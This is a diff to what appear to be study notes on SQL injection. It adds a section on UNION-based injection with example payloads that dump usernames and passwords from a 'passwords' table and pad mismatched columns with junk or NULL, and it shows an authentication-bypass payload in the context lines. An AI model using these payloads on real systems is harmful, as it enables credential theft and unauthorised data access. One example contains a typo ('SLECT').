@@ -69,6 +69,44 @@ Injected Code: admin')--
 SELECT * FROM logins WHERE (username='admin')-- ' AND id > 1) AND password = 'hashed password';
 # As you can see, we properly closed the parenthesis, and commented out the rest of the query, thus returning true
 ```
+## The Union Clause
+### Summary
+Union is used to combine results from multiple SELECT statements
+Can SELECT and dump data from all across the DBMS, from multiple tables and db's
+
+```sql
+# Example single statements
+SELECT * FROM ports;
+SELECT * FROM ships;
+# Each of these returns 1 entry from 1 table
+```
+```sql
+# Exampe UNION combining the above
+SELECT * FROM ports UNION SLECT * FROM ships;
+# Combines the entries from the first 2 statements
+```
+### Even Columns
+Assuming the products table only has 2 columns
+```sql
+SELECT * FROM products WHERE product_id = '1' UNION SELECT username, password from passwords-- ';
+# This query will return username and password from the passwords table
+```
+### Uneven Columns
+We can fill the extra columns with junk data to make even columns
+When filling columns with junk, the data type must match the original column
+For advanced injection, We can use 'NULL' as 'NULL' fits all data types
+
+Assuming: The products table has 2 column, and we only want to retrieve username from the passwords table:
+```sql
+SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords;
+#                                                                     ^ injected junk
+# If the products table had more than 2 columns, like 3 or 4 columns, we would have to add more junk
+SELECT * from products where product_id = '1' UNION SELECT username, 2, 3, 4 from passwords -- ';
+#                                                                    ^  ^  ^ Injected junk
+```
+### Considerations
+UNION statments can only operate on SELECT statements with an equal number of columns
+
 ## In-Band
 ### Summary
 Output of both the intended and new query are output directly to the screen and can be directly read.
